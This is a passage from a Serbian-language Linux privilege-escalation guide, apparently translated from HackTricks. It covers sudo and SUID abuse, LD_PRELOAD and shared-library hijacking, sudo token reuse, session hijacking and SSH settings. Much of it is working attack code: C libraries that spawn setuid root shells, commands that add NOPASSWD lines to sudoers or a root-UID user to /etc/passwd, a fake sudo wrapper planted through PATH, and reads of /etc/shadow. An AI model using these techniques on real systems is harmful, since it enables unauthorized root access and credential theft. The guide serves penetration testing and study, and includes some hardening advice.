Ako otkrijete da možete koristiti **`runc`** komandu, pročitajte sledeću stranicu jer **možda možete zloupotrebiti istu za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran sistem za međuprocesnu komunikaciju (IPC) koji omogućava aplikacijama da efikasno međusobno komuniciraju i dele podatke. Dizajniran za savremeni Linux sistem, nudi robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na unapređene UNIX domain socket-e. Takođe pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal iz Bluetooth daemona o dolazećem pozivu može naterati muzički plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve servisa i pozive metoda između aplikacija, olakšavajući procese koji su tradicionalno bili kompleksni.

D-Bus radi po modelu **allow/deny**, upravljajući dozvolama poruka (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta poklapanja pravila politike. Ove politike specificiraju interakcije sa bus-om, što potencijalno može omogućiti eskalaciju privilegija kroz zloupotrebu tih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, i opisuje dozvole za korisnika root da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez navedenog korisnika ili grupe primenjuju se univerzalno, dok se politike u kontekstu "default" primenjuju na sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da enumerišete i iskoristite D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je korisno enumerisati mrežu i utvrditi poziciju mašine.

### Generička enumeracija
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini sa kojom niste mogli da stupite u interakciju pre nego što ste joj pristupili:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste uspeti da uhvatite neke kredencijale.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Proverite **who** ste, koje **privileges** imate, koji **users** su u sistemima, koji mogu da se **login** i koji imaju **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Neke verzije Linuxa su bile pogođene bagom koji omogućava korisnicima sa **UID > INT_MAX** da izvrše eskalaciju privilegija. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Iskoristite to** koristeći: **`systemd-run -t /bin/bash`**

### Groups

Proverite da li ste **član neke grupe** koja bi vam mogla omogućiti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proverite da li se nešto zanimljivo nalazi u međuspremniku (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** iz okruženja, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta stvaranje mnogo buke i na računaru su prisutni binarni fajlovi `su` i `timeout`, možete pokušati da brute-forceujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrm takođe pokušava da brute-forceuje korisnike.

## Zloupotrebe zapisivog $PATH-a

### $PATH

Ako otkrijete da možete **pisati u neki folder iz $PATH**, možda ćete moći da eskalirate privilegije tako što ćete **napraviti backdoor u zapisivom folderu** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **se ne učitava iz foldera koji se nalazi pre** vašeg zapisivog foldera u $PATH.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili fajlovi mogu imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande omogućavaju vam da čitate i/ili pišete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može dozvoliti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može да покреће `vim` као `root`; сада је тривијално добити shell додавањем ssh key у root директоријум или позивањем `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi varijablu okruženja** tokom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **based on HTB machine Admirer**, je bio **vulnerable** na **PYTHONPATH hijacking** da učita proizvoljnu python biblioteku prilikom izvršavanja skripte kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

Ako sudoers sačuva `BASH_ENV` (npr. `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnih shell-ova da izvršite proizvoljan kod kao root prilikom pozivanja dozvoljene komande.

- Why it works: Za neinteraktivne shell-ove, Bash procenjuje `$BASH_ENV` i učitava taj fajl pre nego što pokrene ciljni skript. Mnogi sudo pravilnici dozvoljavaju pokretanje skripta ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, vaš fajl će biti učitan sa root privilegijama.

- Requirements:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, preferirajte `env_reset`.
- Izbegavajte korišćenje shell wrapper-a za komande koje sudo dozvoljava; koristite minimalne binarne.
- Razmotrite sudo I/O logging i obaveštavanje kada se koriste sačuvane env varijable.

### Putevi za zaobilaženje sudo izvršavanja

**Skoči** da pročitaš druge fajlove ili koristi **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), sve je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako je **sudo dozvola** dodeljena jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom promenljive PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proverite pomoću** _**strings**_ **sadržaj čudnog SUID binary-ja)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, možete pokušati da kreirate i **export a function** sa imenom komande koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i **export a function**:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

Environment varijabla **LD_PRELOAD** se koristi za navođenje jedne ili više deljenih biblioteka (.so fajlova) koje loader treba da učita pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces se naziva preloading biblioteke.

Međutim, da bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde realni user ID (_ruid_) ne odgovara efektivnom user ID (_euid_).
- Za izvršne fajlove sa **suid/sgid**, loader prethodno učitava samo biblioteke iz standardnih putanja koje su takođe **suid/sgid**.

Do eskalacije privilegija može doći ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` uključuje izraz **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** ostane sačuvana i bude priznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvaj kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **compile it** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokrećući
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc se može zloupotrebiti ako napadač kontroliše **LD_LIBRARY_PATH** env variable jer on kontroliše putanju gde će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary sa **SUID** privilegijama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeriše mogućnost eksploatacije.

Da biste to iskoristili, kreirali biste C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj eskalaciju privilegija manipulacijom dozvola fajla i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gore navedeni C fajl u shared object (.so) fajl koristeći:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Konačno, pokretanje pogođenog SUID binary trebalo bi da pokrene exploit, omogućavajući potencijalno system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz direktorijuma u koji možemo pisati, napravimo biblioteku u tom direktorijumu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve gde možete **only inject arguments** u komandu.

Projekat sakuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti za izlazak iz ograničenih shells, eskalaciju ili održavanje povišenih privilegija, prenos fajlova, pokretanje bind i reverse shells, i olakšavanje drugih post-exploitation zadataka.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pristupite `sudo -l` možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li može da pronađe način da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo access** ali ne lozinku, možete eskalirati privilegije tako što ćete **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **used `sudo`** da pokrene nešto u **last 15mins** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno menjajući `/etc/sysctl.d/10-ptrace.conf` i postavljajući `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi uslovi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. Možete ga koristiti da **activate the sudo token in your session** (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **treći exploit** (`exploit_v3.sh`) će **napraviti sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili na bilo kojim fajlovima kreiranim u tom folderu, možete koristiti binarni [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da kreirate **sudo token** za korisnika i PID.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID 1234, možete **dobiti sudo privilegije** bez potrebe да znate lozinku tako što ćete:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ovi fajlovi **po podrazumevanju mogu da budu čitani samo od strane korisnika root i grupe root**.\
**Ako** možete **pročitati** ovaj fajl, mogli biste **dobiti neke zanimljive informacije**, a ako možete **pisati** bilo koji fajl, moći ćete da **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možete да пишете, можете и да злоупотребите ово дозволaње.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje alternative binarnom `sudo`, kao što je `doas` na OpenBSD; proverite konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da **korisnik obično povezuje na mašinu i koristi `sudo`** da eskalira privilegije i imate shell u tom korisničkom kontekstu, možete **kreirati novi sudo izvršni fajl** koji će prvo pokrenuti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** korisničkog konteksta (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik izvrši sudo, izvrši se vaš sudo izvršni fajl.

Obratite pažnju da ako korisnik koristi drugi shell (ne `bash`) moraćete da izmenite druge fajlove da biste dodali novi put. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Još jedan primer možete naći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle se učitaju konfiguracioni fajlovi**. Obično ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će se pročitati konfiguracioni fajlovi iz `/etc/ld.so.conf.d/*.conf`. Ti konfiguracioni fajlovi **pokazuju na druge foldere** u kojima će se tražiti **biblioteke**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima prava za pisanje** na bilo koji od navedenih puteva: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo koji fajl unutar `/etc/ld.so.conf.d/` ili bilo koji folder naveden u konfiguracionom fajlu unutar `/etc/ld.so.conf.d/*.conf`, on može biti u mogućnosti da eskalira privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/` program će koristiti lib na ovom mestu kako je navedeno u `RPATH` promenljivoj.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Mogućnosti

Linux capabilities pružaju a **podskup dostupnih root privilegija procesu**. Ovo efektivno razlaže root **privilegije na manje i odvojene jedinice**. Svakoj od ovih jedinica se zatim može nezavisno dodeliti procesima. Na taj način se smanjuje kompletan skup privilegija, čime se smanjuje rizik od iskorišćavanja.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dozvole direktorijuma

U direktorijumu, **bit for "execute"** implicira da pogođeni korisnik može "**cd**" u folder.\
Bit **"read"** implicira da korisnik može **list** the **files**, a bit **"write"** implicira da korisnik može **delete** i **create** nove **files**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **overriding the traditional ugo/rwx permissions**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima tako što dozvoljavaju ili uskraćuju prava određenim korisnicima koji nisu vlasnici niti članovi grupe. Ovaj nivo **granularnosti omogućava preciznije upravljanje pristupom**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeliti** korisniku "kali" read i write dozvole nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pribavi** fajlove sa određenim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sessions

U **starijim verzijama** možete **hijack** neku **shell** session drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da **connect** samo na screen sessions svog korisnika. Međutim, možete pronaći **interesantne informacije unutar session**.

### screen sessions hijacking

**Lista screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Prikači se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **starim tmux verzijama**. Nisam uspeo da hijackujem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovani korisnik.

**Lista tmux sesija**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključi se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Proverite **Valentine box from HTB** za primer.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bagom.\
Ovaj bag nastaje pri kreiranju novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da, **posedujući ssh public key, možete potražiti odgovarajući privatni ključ**. Možete pronaći izračunate mogućnosti ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Zanimljive vrednosti SSH konfiguracije

- **PasswordAuthentication:** Određuje da li je dozvoljena autentifikacija lozinkom. Podrazumevano je `no`.
- **PubkeyAuthentication:** Određuje da li je dozvoljena autentifikacija javnim ključem. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Određuje da li se root može prijaviti preko ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root se može prijaviti korišćenjem lozinke i privatnog ključa
- `without-password` or `prohibit-password`: root se može prijaviti samo pomoću privatnog ključa
- `forced-commands-only`: root se može prijaviti samo koristeći privatni ključ i ako su navedene opcije komandi
- `no` : nije dozvoljeno

### AuthorizedKeysFile

Određuje fajlove koji sadrže javne ključeve koji se mogu koristiti za autentifikaciju korisnika. Može sadržati tokene kao što je `%h`, koji će biti zamenjen home direktorijumom. **Možete navesti apsolutne putanje** (počinjući sa `/`) ili **relativne putanje u odnosu na korisnikov home**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će označiti da, ako pokušate da se prijavite koristeći **privatni** ključ korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (bez passphrase-ova!) na vašem serveru. Dakle, bićete u mogućnosti da **pređete** putem ssh **na host**, a odatle **pređete na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Potrebno je da podesite ovu opciju u `$HOME/.ssh.config` na sledeći način:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*` svaki put kada korisnik pređe na drugi host, taj host će moći da pristupi ključevima (što predstavlja sigurnosni problem).

Fajl `/etc/ssh_config` može **override** ove **opcije** i dozvoliti ili onemogućiti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može **allow** ili **denied** ssh-agent forwarding koristeći ključnu reč `AllowAgentForwarding` (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisana u okruženju, pročitajte sledeću stranu jer **možda ćete moći da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Fajl `/etc/profile` i fajlovi u `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu shell sesiju**. Dakle, ako možete **pisati ili izmeniti bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka neobična profilna skripta, trebalo bi da je proverite zbog **osetljivih podataka**.

### Passwd/Shadow Files

U zavisnosti od operativnog sistema fajlovi `/etc/passwd` i `/etc/shadow` mogu koristiti drugačije ime ili može postojati rezervna kopija. Zato se preporučuje da **pronađete sve njih** i **proverite da li ih možete pročitati** kako biste videli **da li se u fajlovima nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Ponekad možete pronaći **password hashes** u datoteci `/etc/passwd` (ili u ekvivalentnoj datoteci).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo generišite password pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i postavite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Na primer: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može oslabiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete **pisati u neke osetljive fajlove**. Na primer, možete li pisati u neki **service configuration file**?
```bash
